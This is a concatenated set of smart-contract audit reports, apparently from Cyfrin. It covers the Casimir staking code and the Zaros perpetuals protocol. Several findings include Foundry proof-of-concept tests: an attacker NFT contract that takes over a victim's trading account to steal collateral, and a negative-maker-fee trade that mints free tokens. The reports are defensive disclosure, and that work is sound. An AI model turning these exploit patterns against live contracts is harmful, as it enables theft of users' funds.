**Description:** The function `getNextUnstake()` is used to get the next unstake request in the queue, while also verifying if the request can be fulfilled. One of the condition to make the request fulfillable is `unstake.period <= reportPeriod`.

```solidity
function getNextUnstake() public view returns (Unstake memory unstake, bool fulfillable) {
    if (unstakeQueue.length > 0) {
        unstake = unstakeQueue[0];
        fulfillable = unstake.period <= reportPeriod && unstake.amount <= getWithdrawableBalance();
    }
}
```

However, given the current codebase, the `unstake.period` will always less or equal to `reportPeriod`. This is because the ``unstake.period` will be assigned with `reportPeriod` when the unstake request is created/queued but the value of `reportPeriod` is intended to be only increasing overtime.

```solidity
unstakeQueue.push(Unstake({userAddress: msg.sender, amount: amount, period: reportPeriod}));
...
reportPeriod++;
```

**Impact:** The check `unstake.period <= reportPeriod` has no effect since it always returns true.

**Recommended Mitigation:** Consider reviewing the logic in function `getNextUnstake()` and removing the period check if it is unnecessary.

**Casimir:**
Mitigated in [28baa81](https://github.com/casimirlabs/casimir-contracts/commit/28baa8191a1b5a27d3ee495dee0d993177bf7e5f).

**Cyfrin:** Verified.


### Unused function `validateWithdrawalCredentials()`

**Description:** The function `validateWithdrawalCredentials()` in CasimirManager is private and isn't called anywhere in the contract.

```solidity
function validateWithdrawalCredentials(address withdrawalAddress, bytes memory withdrawalCredentials) // @audit never used
    private
    pure
{
    bytes memory computedWithdrawalCredentials = abi.encodePacked(bytes1(uint8(1)), bytes11(0), withdrawalAddress);
    if (keccak256(computedWithdrawalCredentials) != keccak256(withdrawalCredentials)) {
        revert InvalidWithdrawalCredentials();
    }
}
```

**Recommended Mitigation:** Consider removing the unused function.

**Casimir:**
Fixed in [d6bd8da](https://github.com/casimirlabs/casimir-contracts/commit/d6bd8dae6e8e2f927f34abc3fdb2db15899ae71b).

**Cyfrin:** Verified.


### `getUserStake` function failure for non-staker accounts

**Description:** The function `getUserStake` in the smart contract throws an error when invoked for an address that does not have any stakes. Specifically, the function fails due to a division by zero error. This occurs because the divisor, `users[userAddress].rewardStakeRatioSum0`, can be zero if `userAddress` has never staked, leading to an unhandled exception in the `Math.mulDiv` operation.

````solidity
function getUserStake(address userAddress) public view returns (uint256 userStake) {
    userStake = Math.mulDiv(users[userAddress].stake0, rewardStakeRatioSum, users[userAddress].rewardStakeRatioSum0);
}
````

**Recommended Mitigation:** Consider modifying the `getUserStake` function to include a check for a zero divisor before performing the division. If `users[userAddress].rewardStakeRatioSum0` is zero, the function should return a stake of 0 to avoid the division by zero error.

**Casimir:**
Fixed in [27c09f5](https://github.com/casimirlabs/casimir-contracts/commit/27c09f548d6d73222a087f2ef237335353cdfefa)

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-07-10-cyfrin-casimir-v2.0.md ------


------ FILE START car/reports_md/2024-07-13-cyfrin-zaros-v2.0.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)
 
**Assisting Auditors**

   


---

# Findings
## Critical Risk


### Attacker can burn `USDToken` from any user

**Description:** [USDToken::burn](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/usd/USDToken.sol#L21-L24) has:
* no access control meaning anyone can call it
* arbitrary address parameter, not using `msg.sender`

**Impact:** Anyone can call `USDToken::burn` to burn the tokens of any user.

**Recommended Mitigation:** Two options:
1) implement access control such that only trusted roles can call `USDToken::burn`
2) remove the arbitrary address input and use `msg.sender` so users can only burn their own tokens

**Zaros:** Fixed in commit [819f624](https://github.com/zaros-labs/zaros-core/commit/819f624eb9fab30599bc5383191d3dcceb3c44e8).

**Cyfrin:** Verified.


### Attacker can steal user deposited collateral tokens by updating account nft token to a custom attack contract address

**Description:** `GlobalConfigurationBranch.setTradingAccountToken` has [no access control](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L147-L153) meaning an attacker could update the account nft token to an arbitrary address.

**Impact:** An attacker can use a custom attack contract to steal user deposited collateral.

**Proof of Concept:** Add the following code to new file `test/integration/perpetuals/trading-account-branch/depositMargin/stealMargin.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

// Zaros dependencies
import { Errors } from "@zaros/utils/Errors.sol";
import { Base_Test } from "test/Base.t.sol";
import { TradingAccountBranch } from "@zaros/perpetuals/branches/TradingAccountBranch.sol";

// @audit used for attack contract
import { ERC721, ERC721Enumerable } from "@openzeppelin/token/ERC721/extensions/ERC721Enumerable.sol";
import { IPerpsEngine } from "@zaros/perpetuals/PerpsEngine.sol";

contract AttackerAccountNFT is ERC721Enumerable {
    constructor() ERC721("", "") { }

    function stealAccount(address perpsEngineAddr, uint128 tokenId) external {
        // @audit mint attacker the requested tokenId
        _mint(msg.sender, tokenId);

        // @audit call perps engine to transfer account to attacker
        IPerpsEngine perpsEngine = IPerpsEngine(perpsEngineAddr);
        perpsEngine.notifyAccountTransfer(msg.sender, tokenId);
    }
}

contract StealMargin_Integration_Test is Base_Test {
    function setUp() public override {
        Base_Test.setUp();
    }

    function test_AttackerStealsUserCollateral() external {
        // @audit naruto the victim will create an account and deposit
        uint256 amountToDeposit = 10 ether;
        deal({ token: address(usdToken), to: users.naruto, give: amountToDeposit });

        uint128 victimTradingAccountId = perpsEngine.createTradingAccount();

        // it should emit {LogDepositMargin}
        vm.expectEmit({ emitter: address(perpsEngine) });
        emit TradingAccountBranch.LogDepositMargin(
            users.naruto, victimTradingAccountId, address(usdToken), amountToDeposit
        );

        // it should transfer the amount from the sender to the trading account
        expectCallToTransferFrom(usdToken, users.naruto, address(perpsEngine), amountToDeposit);
        perpsEngine.depositMargin(victimTradingAccountId, address(usdToken), amountToDeposit);

        uint256 newMarginCollateralBalance =
            perpsEngine.getAccountMarginCollateralBalance(victimTradingAccountId, address(usdToken)).intoUint256();

        // it should increase the amount of margin collateral
        assertEq(newMarginCollateralBalance, amountToDeposit, "depositMargin");

        // @audit sasuke the attacker will steal naruto's deposit
        // beginning state: theft has not occured
        assertEq(0, usdToken.balanceOf(users.sasuke));
        //
        // @audit 1) sasuke creates their own hacked `AccountNFT` contract
        vm.startPrank(users.sasuke);
        AttackerAccountNFT attackerNftContract = new AttackerAccountNFT();

        // @audit 2) sasuke uses lack of access control to make their
        // hacked `AccountNFT` contract the official contract
        perpsEngine.setTradingAccountToken(address(attackerNftContract));

        // @audit 3) sasuke calls the attack function in their hacked `AccountNFT`
        // contract to steal ownership of the victim's account
        attackerNftContract.stealAccount(address(perpsEngine), victimTradingAccountId);

        // @audit 4) sasuke withdraws the victim's collateral
        perpsEngine.withdrawMargin(victimTradingAccountId, address(usdToken), amountToDeposit);
        vm.stopPrank();

        // @audit end state: sasuke has stolen the victim's deposited collateral
        assertEq(amountToDeposit, usdToken.balanceOf(users.sasuke));
    }
}
```

Run with: `forge test --match-test test_AttackerStealsUserCollateral`

**Recommended Mitigation:** Add the `onlyOwner` modifier to `GlobalConfigurationBranch.setTradingAccountToken`.

**Zaros:** Fixed in commit [819f624](https://github.com/zaros-labs/zaros-core/commit/819f624eb9fab30599bc5383191d3dcceb3c44e8).

**Cyfrin:** Verified.


### `TradingAccount::withdrawMarginUsd` transfers an incorrectly larger amount of margin collateral for tokens with less than 18 decimals

**Description:** The `UD60x18` values are [scaled up to 18 decimal places](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/MarginCollateralConfiguration.sol#L46-L50) for collateral tokens with less than 18 decimals places. But when `TradingAccount::withdrawMarginUsd` transfers tokens to the recipient it doesn't scale the transferred amount back down to the collateral token's native decimal value:

```solidity
function withdrawMarginUsd(
    Data storage self,
    address collateralType,
    UD60x18 marginCollateralPriceUsdX18,
    UD60x18 amountUsdX18,
    address recipient
)
    internal
    returns (UD60x18 withdrawnMarginUsdX18, bool isMissingMargin)
{
    UD60x18 marginCollateralBalanceX18 = getMarginCollateralBalance(self, collateralType);
    UD60x18 requiredMarginInCollateralX18 = amountUsdX18.div(marginCollateralPriceUsdX18);
    if (marginCollateralBalanceX18.gte(requiredMarginInCollateralX18)) {
        withdraw(self, collateralType, requiredMarginInCollateralX18);

        withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(amountUsdX18);

        // @audit wrong amount for collateral tokens with less than 18 decimals
        // needs to be scaled down to collateral token's native precision
        IERC20(collateralType).safeTransfer(recipient, requiredMarginInCollateralX18.intoUint256());

        isMissingMargin = false;
        return (withdrawnMarginUsdX18, isMissingMargin);
    } else {
        UD60x18 marginToWithdrawUsdX18 = marginCollateralPriceUsdX18.mul(marginCollateralBalanceX18);
        withdraw(self, collateralType, marginCollateralBalanceX18);
        withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(marginToWithdrawUsdX18);

        // @audit wrong amount for collateral tokens with less than 18 decimals
        // needs to be scaled down to collateral token's native precision
        IERC20(collateralType).safeTransfer(recipient, marginCollateralBalanceX18.intoUint256());

        isMissingMargin = true;
        return (withdrawnMarginUsdX18, isMissingMargin);
    }
}
```

Here is a possible scenario.
- A user deposits 10K USDC(has 6 decimals) to his trading account. Then his margin collateral balance will be `10000 * 10^(18 - 6) = 10^16`.
- During a liquidation/settlement, `withdrawMarginUsd` is called with `requiredMarginInCollateralX18 = 1e4` which means `10^-8 USDC`.
- But due to the incorrect decimal conversion logic, the function transfers the whole collateral(10K USDC) but still has `10^16 - 10^4` collateral balance.

**Impact:** Margin collateral balances become corrupt allowing users to withdraw more collateral than they should leading to loss of funds for other users since they won't be able to withdraw.

**Recommended Mitigation:** `withdrawMarginUsd` should scale the amount down to the collateral token's native precision before calling `safeTransfer`.

**Zaros:** Fixed in commit [1ac2acc](https://github.com/zaros-labs/zaros-core/commit/1ac2acc179830c08069b3e5856b9439867a06d50#diff-f09472a5f9e6d5545d840c0760cb5606febbfe8a60fa8b7fc6e7cda8735ce357R378-R396).

**Cyfrin:** Verified.


### Impossible to liquidate accounts with multiple active markets as `LiquidationBranch::liquidateAccounts` reverts due to corruption of ordering in `TradingAccount::activeMarketsIds`

**Description:** `LiquidationBranch::liquidateAccounts` iterates through the active markets of the account being liquidated, assuming that the ordering of these active markets will remain constant:
```solidity
// load open markets for account being liquidated
ctx.amountOfOpenPositions = tradingAccount.activeMarketsIds.length();

// iterate through open markets
for (uint256 j = 0; j < ctx.amountOfOpenPositions; j++) {
    // load current active market id into working data
    // @audit assumes constant ordering of active markets
    ctx.marketId = tradingAccount.activeMarketsIds.at(j).toUint128();

    PerpMarket.Data storage perpMarket = PerpMarket.load(ctx.marketId);
    Position.Data storage position = Position.load(ctx.tradingAccountId, ctx.marketId);

    ctx.oldPositionSizeX18 = sd59x18(position.size);
    ctx.liquidationSizeX18 = unary(ctx.oldPositionSizeX18);

    ctx.markPriceX18 = perpMarket.getMarkPrice(ctx.liquidationSizeX18, perpMarket.getIndexPrice());

    ctx.fundingRateX18 = perpMarket.getCurrentFundingRate();
    ctx.fundingFeePerUnitX18 = perpMarket.getNextFundingFeePerUnit(ctx.fundingRateX18, ctx.markPriceX18);

    perpMarket.updateFunding(ctx.fundingRateX18, ctx.fundingFeePerUnitX18);
    position.clear();

    // @audit this calls `EnumerableSet::remove` which changes the order of `activeMarketIds`
    tradingAccount.updateActiveMarkets(ctx.marketId, ctx.oldPositionSizeX18, SD_ZERO);
```

However this is not true as `activeMarketIds` is an `EnumerableSet` which explicitly provides [no guarantees](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L16) that the order of elements is [preserved](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L131-L141) and its `remove` function uses the [swap-and-pop](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L89-L91) method for performance reasons which *guarantees* that order will be corrupted when an active market is removed.

**Impact:** When a trading account has multiple open markets, during liquidation once the first open market is closed the ordering of the account's `activeMarketIds` will be corrupted. This results in the liquidation transaction reverting with `panic: array out-of-bounds access` when attempting to remove the last active market.

Hence it is impossible to liquidate users with multiple active markets; a user can make themselves impossible to liquidate by having positions in multiple active markets.

**Proof of Concept:** Add the following helper function to `test/Base.t.sol`:
```solidity
function openManualPosition(
    uint128 marketId,
    bytes32 streamId,
    uint256 mockUsdPrice,
    uint128 tradingAccountId,
    int128 sizeDelta
) internal {
    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: marketId,
            sizeDelta: sizeDelta
        })
    );

    bytes memory mockSignedReport = getMockedSignedReport(streamId, mockUsdPrice);

    changePrank({ msgSender: marketOrderKeepers[marketId] });

    // fill first order and open position
    perpsEngine.fillMarketOrder(tradingAccountId, marketId, mockSignedReport);

    changePrank({ msgSender: users.naruto });
}
```

Then add the PoC function to `test/integration/perpetuals/liquidation-branch/liquidateAccounts.t.sol`:
```solidity
function test_ImpossibleToLiquidateAccountWithMultipleMarkets() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto opens second position in ETH market
    openManualPosition(ETH_USD_MARKET_ID, ETH_USD_STREAM_ID, MOCK_ETH_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // make ETH position liquidatable
    updateMockPriceFeed(ETH_USD_MARKET_ID, MOCK_ETH_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // attempt to liquidate naruto
    changePrank({ msgSender: liquidationKeeper });

    // this reverts with "panic: array out-of-bounds access"
    // due to the order of `activeMarketIds` being corrupted by
    // the removal of the first active market then when attempting
    // to remove the second active market it triggers this error
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);

    // comment out the ETH position above it no longer reverts since
    // then user would only have 1 active market
    //
    // comment out the following line from `LiquidationBranch::liquidateAccounts`
    // and it also won't revert since the active market removal won't happen:
    //
    // tradingAccount.updateActiveMarkets(ctx.marketId, ctx.oldPositionSizeX18, SD_ZERO);
}
```

Run with: `forge test --match-test test_ImpossibleToLiquidateAccountWithMultipleMarkets`

**Recommended Mitigation:** Use a data structure that preserves order to store trading account's active market ids.

Alternatively in `LiquidationBranch::liquidateAccounts`, don't remove the active market ids inside the `for` loop but remove them after the `loop` has finished. This will result in a consistent iteration order over the active markets during the `for` loop.

Another option is to get a memory copy by calling `EnumerableSet::values` and iterate over the memory copy instead of storage, eg:
```diff
- ctx.marketId = tradingAccount.activeMarketsIds.at(j).toUint128();
+ ctx.marketId = activeMarketIdsCopy[j].toUint128();
```

**Zaros:** Fixed in commit [53a3646](https://github.com/zaros-labs/zaros-core/commit/53a3646fef8db5e7da5cbe428bbb2d167f45e8bf).

**Cyfrin:** Verified.


### Attacker can perform a risk-free trade to mint free USDz tokens by opening then quickly closing positions for markets using negative `makerFee`

**Description:** Attacker can perform a risk-free trade to mint free USDz tokens by opening then quickly closing positions in markets using negative `makerFee`; this is effectively a free mint exploit dressed up as a risk-free "trade".

**Proof of Concept:** First change `script/markets/BtcUsd.sol` to have a negative `makerFee` like this:
```solidity
-    OrderFees.Data internal btcUsdOrderFees = OrderFees.Data({ makerFee: 0.0004e18, takerFee: 0.0008e18 });
+    OrderFees.Data internal btcUsdOrderFees = OrderFees.Data({ makerFee: -0.0004e18, takerFee: 0.0008e18 });
```

Then add PoC to `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`:
```solidity
// new import at the top
import {console} from "forge-std/console.sol";

function test_AttackerMintsFreeUSDzOpenThenQuicklyClosePositionMarketNegMakerFee() external {
    // In a market with a negative maker fee, an attacker can perform
    // a risk-free "trade" by opening then quickly closing a position.
    // This allows attackers to mint free USDz without
    // any risk; it is essentially a free mint exploit dressed up
    // as a risk-free "trade"

    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto closes position in BTC market immediately after
    // in practice this would occur one or more blocks after the
    // first order had been filled
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // verify that now naruto has MORE USDz than they started with!
    uint256 traderCollateralBalance = perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256();
    assert(traderCollateralBalance > USER_STARTING_BALANCE);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken), traderCollateralBalance);

    // verify that naruto has withdrawn more USDz than they deposited
    uint256 traderFinalUsdzBalance = usdToken.balanceOf(users.naruto);
    assert(traderFinalUsdzBalance > USER_STARTING_BALANCE);

    // output the profit
    console.log("Start USDz  : %s", USER_STARTING_BALANCE);
    console.log("Final USDz  : %s", traderFinalUsdzBalance);
    console.log("USDz profit : %s", traderFinalUsdzBalance - USER_STARTING_BALANCE);

    // profit = 796 040000000000000000
    //        = $796
}
```

Run with: `forge test --match-test test_AttackerMintsFreeUSDzOpenThenQuicklyClosePositionMarketNegMakerFee -vvv`

**Impact:** The attacker can effectively perform a risk-free or minimal-risk trade to harvest free tokens via the negative `marginFee`; in the PoC the attacker was able to profit $796.

One potential invalidation for this attack vector is that in the real system the protocol controls the keepers who fill orders so an attacker couldn't force both trades into the same block in practice.

The real-world flow would go like this:

1) Attacker creates market order to buy (block 1)
2) Keeper fills buy order (block 2)
3) Attacker creates market order to sell (block 3)
4) Keeper fills sell order (block 4)

So it couldn't be done in one block in practice which means the attacker would be exposed to market movements for a tiny amount of time and that it isn't flash loan exploitable.

But it still seems quite exploitable to mint free tokens with very little exposure to market movements especially as the attacker is able to harvest the maker fee on both transactions by exploiting these 2 Low findings:
* `PerpMarket::getOrderFeeUsd rewards traders who flip the skew with makerFee for the full trade`
* `PerpMarket::getOrderFeeUsd incorrectly charges makerFee when skew is zero and trade is buy order`

**Recommended Mitigation:** Two possible options:
1) Don't allow negative `makerFee` / `takerFee`; change `leaves/OrderFees.sol` to use `uint128`.
2) If negative fees are desired implement a minimum time for which a position must remain open before it can be modified so that an attacker couldn't open a position then quickly close it to simply cash out the `makerFee`.

**Zaros:** Fixed in commit [e03228e](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3) by no longer supporting negative fees; both `makerFee` and `takerFee` are now unsigned.

**Cyfrin:** Verified.

\clearpage
## High Risk


### `TradingAccountBranch::depositMargin` attempts to transfer greater amount than user deposited for tokens with less than 18 decimals

**Description:** For collateral tokens with less than 18 decimals, `TradingAccountBranch::depositMargin` attempts to transfer a greater amount of tokens than what the user is actually depositing as:
* input `amount` is converted into `ud60x18Amount` via `MarginCollateralConfiguration::convertTokenAmountToUd60x18` which [scales up `amount` to 18 decimals](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/MarginCollateralConfiguration.sol#L46-L50)
* the `safeTransferFrom` call is passed `ud60x18Amount::intoUint256` which converts that scaled up input amount back to `uint256`

```solidity
function depositMargin(uint128 tradingAccountId, address collateralType, uint256 amount) public virtual {
    // load margin collateral config for this collateral type
    MarginCollateralConfiguration.Data storage marginCollateralConfiguration =
        MarginCollateralConfiguration.load(collateralType);

    // @audit convert uint256 -> UD60x18; scales input amount to 18 decimals
    UD60x18 ud60x18Amount = marginCollateralConfiguration.convertTokenAmountToUd60x18(amount);

    // *snip* //

    // @audit fetch tokens from the user; using the ud60x18Amount which has been
    // scaled up to 18 decimals. Will attempt to transfer more tokens than
    // user actually depositing
    IERC20(collateralType).safeTransferFrom(msg.sender, address(this), ud60x18Amount.intoUint256());
```

**Impact:** For collateral tokens with less than 18 decimals, `TradingAccountBranch::depositMargin` will attempt to transfer more tokens than the user is actually depositing. If the user has not approved the greater amount (or infinite approval) the transaction will revert; similarly if the user does not have sufficient funds it will also revert. If the user has sufficient funds and has granted the approval the user's tokens will be stolen by the protocol.


**Recommended Mitigation:** The `safeTransferFrom` should use `amount` instead of `ud60x18Amount`.

```diff
- IERC20(collateralType).safeTransferFrom(msg.sender, address(this), ud60x18Amount.intoUint256());
+ IERC20(collateralType).safeTransferFrom(msg.sender, address(this), amount);
```

**Zaros:** Fixed in commit [3fe9c0a](https://github.com/zaros-labs/zaros-core/commit/3fe9c0a21394cbbb0fc9999dfd534e2b723cc071#diff-b7968970769299fcdbfb6ef6a99fb78342b70e422a56416e5d9c107e5a009fc3R274).

**Cyfrin:** Verified.


### `GlobalConfiguration::removeCollateralFromLiquidationPriority` corrupts the collateral priority order resulting in incorrect order of collateral liquidation

**Description:** `GlobalConfiguration` [uses](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/GlobalConfiguration.sol#L46) OpenZeppelin's `EnumerableSet` to store the collateral liquidation priority order:
```solidity
/// @param collateralLiquidationPriority The set of collateral types in order of liquidation priority
struct Data {
    /* snip....*/
    EnumerableSet.AddressSet collateralLiquidationPriority;
}
```

But OpenZeppelin's `EnumerableSet` explicitly provides [no guarantees](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L16) that the order of elements is [preserved](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L131-L141) and its `remove` function uses the [swap-and-pop](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L89-L91) method for performance reasons which *guarantees* that order will be corrupted when collateral is removed.

**Impact:** When one collateral is removed from the set, the collateral priority order will become corrupted. This will result in the incorrect collateral being prioritized for liquidation and other functions within the protocol.

**Proof of Concept:** Check out this stand-alone Foundry PoC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import { EnumerableSet } from "openzeppelin-contracts/utils/structs/EnumerableSet.sol";

import "forge-std/Test.sol";

// run from base project directory with:
// forge test --match-contract SetTest
contract SetTest is Test {
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet collateralLiquidationPriority;

    function test_collateralLiquidationPriorityReorders() external {
        // create original order of collateral liquidation priority
        address collateralType1 = address(1);
        address collateralType2 = address(2);
        address collateralType3 = address(3);
        address collateralType4 = address(4);
        address collateralType5 = address(5);

        // add them to the set
        collateralLiquidationPriority.add(collateralType1);
        collateralLiquidationPriority.add(collateralType2);
        collateralLiquidationPriority.add(collateralType3);
        collateralLiquidationPriority.add(collateralType4);
        collateralLiquidationPriority.add(collateralType5);

        // affirm length and correct order
        assertEq(5, collateralLiquidationPriority.length());
        assertEq(collateralType1, collateralLiquidationPriority.at(0));
        assertEq(collateralType2, collateralLiquidationPriority.at(1));
        assertEq(collateralType3, collateralLiquidationPriority.at(2));
        assertEq(collateralType4, collateralLiquidationPriority.at(3));
        assertEq(collateralType5, collateralLiquidationPriority.at(4));

        // everything looks good, the collateral priority is 1->2->3->4->5

        // now remove the first element as we don't want it to be a valid
        // collateral anymore
        collateralLiquidationPriority.remove(collateralType1);

        // length is OK
        assertEq(4, collateralLiquidationPriority.length());

        // we now expect the order to be 2->3->4->5
        // but EnumerableSet explicitly provides no guarantees on ordering
        // and for removing elements uses the `swap-and-pop` technique
        // for performance reasons. Hence the 1st priority collateral will
        // now be the last one!
        assertEq(collateralType5, collateralLiquidationPriority.at(0));

        // the collateral priority order is now 5->2->3->4 which is wrong!
        assertEq(collateralType2, collateralLiquidationPriority.at(1));
        assertEq(collateralType3, collateralLiquidationPriority.at(2));
        assertEq(collateralType4, collateralLiquidationPriority.at(3));
    }
}
```

**Recommended Mitigation:** Use a data structure that preserves order to store the collateral liquidation priority.

Alternatively OpenZeppelin's `EnumerableSet` can be used but its `remove` function should never be called - when removing collateral the entire set must be emptied and a new set configured with the previous ordering minus the removed element.

**Zaros:** Fixed in commit [862a3c6](https://github.com/zaros-labs/zaros-core/commit/862a3c6514248b30c803bc26b753fd9b21e20982).

**Cyfrin:** Verified.


### Trader can't reduce open position size when under initial margin requirement but over maintenance margin requirement

**Description:** [`OrderBranch::createMarketOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/OrderBranch.sol#L204-L208) and [`SettlementBranch::_fillOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/SettlementBranch.sol#L130-L139) always enforce the initial margin requirement, even when a trader is reducing the size of a previously opened position.

**Impact:** When a trader's position has negative PNL and no longer satisfies the initial margin requirement, the trader may wish to reduce the position size before their position continues to deteriorate and goes below the maintenance margin requirement which would cause their position to be liquidated.

However in this case when the trader attempts to reduce their position size the transaction will always revert since `OrderBranch::createMarketOrder` and `SettlementBranch::_fillOrder` always enforce the initial margin requirement even when reducing already opened positions.

Hence a trader is unable to scale down their exposure to a losing position that is not yet subject to liquidation.

**Proof of Concept:** Add the following PoC to `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.sol`:
```solidity
function test_TraderCantReducePositionSizeWhenCollateralUnderIntitialRequired() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves against Naruto's position
    // giving Naruto a negative PNL but not to the point of liquidation
    // if changed this to "/10" instead of "/11" naruto would be liquidatable,
    // so this is just on the verge of being liquidated
    uint256 updatedPrice = MOCK_BTC_USD_PRICE-MOCK_BTC_USD_PRICE/11;
    updateMockPriceFeed(BTC_USD_MARKET_ID, updatedPrice);

    // naruto's position now is below the initial margin requirement
    // but above the maintenance requirement. Naruto attempts to
    // reduce their position size to limit exposure but this reverts
    // with `InsufficientMargin` since `OrderBranch::createMarketOrder`
    // and `SettlementBranch::_fillOrder` always check against initial
    // margin requirements even when reducing already opened positions
    openManualPosition(BTC_USD_MARKET_ID,
                       BTC_USD_STREAM_ID,
                       updatedPrice,
                       tradingAccountId,
                       USER_POS_SIZE_DELTA-USER_POS_SIZE_DELTA/2);
}
```

Run with: `forge test --match-test test_TraderCantReducePositionSizeWhenCollateralUnderIntitialRequired -vvv`

**Recommended Mitigation:** When modifying an already opened position, `OrderBranch::createMarketOrder` and `SettlementBranch::_fillOrder` should check against the required maintenance margin. A trader who is not subject to liquidation should be able to reduce their position size when they are under the required initial margin but over the required maintenance margin.

**Zaros:** Fixed in commit [22a0385](https://github.com/zaros-labs/zaros-core/commit/22a0385fca34b79d42dd6f3bc627e2335756ccc3).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### `ChainlinkUtil::getPrice` doesn't check for stale price

**Description:** [`ChainlinkUtil::getPrice`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/external/chainlink/ChainlinkUtil.sol#L32-L33) doesn't [check for stale prices](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#99af).

**Impact:** Code will execute with prices that dont reflect the current pricing resulting in a potential loss of funds for users.

**Recommended Mitigation:** Check `updatedAt` returned by `latestRoundData` against each price feed's [individual heartbeat](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78). Heartbeats could be stored in:
* `MarginCollateralConfiguration::Data`
* `MarketConfiguration::Data`

**Zaros:** Fixed in commit [c70c9b9](https://github.com/zaros-labs/zaros-core/commit/c70c9b9399af8eb5e351f9b4f43feed82e19ef5b#diff-dc206ca4ca1f5e661061478ee4bd43c0c979d77a1ce1e0f30745d766bcd65394R39-R43).

**Cyfrin:** Verified.


### `ChainlinkUtil::getPrice` doesn't check if L2 Sequencer is down

**Description:** When using Chainlink with L2 chains like Arbitrum, smart contracts must [check whether the L2 Sequencer is down](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf) to avoid stale pricing data that appears fresh.

**Impact:** Code will execute with prices that dont reflect the current pricing resulting in a potential loss of funds for users.

**Recommended Mitigation:** Chainlinks official documentation provides an [example](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) implementation of checking L2 sequencers.

